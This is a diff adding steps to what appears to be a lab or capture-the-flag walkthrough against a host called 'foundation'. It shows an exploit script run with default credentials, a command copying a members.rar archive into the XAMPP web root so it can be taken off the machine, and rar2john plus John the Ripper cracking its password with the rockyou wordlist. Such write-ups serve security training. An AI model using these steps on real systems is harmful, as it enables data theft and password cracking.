@@ -27,3 +27,17 @@ python3 sc.py -u http://foundation/ -l admin -p password
 ```
 ![image](https://github.com/stensil4rt/CodeBy/assets/62753044/2604cb3a-0647-4bb4-addd-b95747e42d7f)
 
+```
+copy C:\IT-support\members.rar C:\xampp\htdocs\members.rar
+```
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/3e6d6d4c-a717-4243-a76a-25bba2b661ed)
+
+```
+rar2john members.rar > rar.hash
+john --wordlist=/home/kali/PAYLOADS/rockyou.txt rar.hash
+```
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/4cfab936-c40f-49cb-9d88-6e8389be8deb)
+
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/45092782-9ac5-4cd6-b8ea-0b184a81d8b3)
+
+
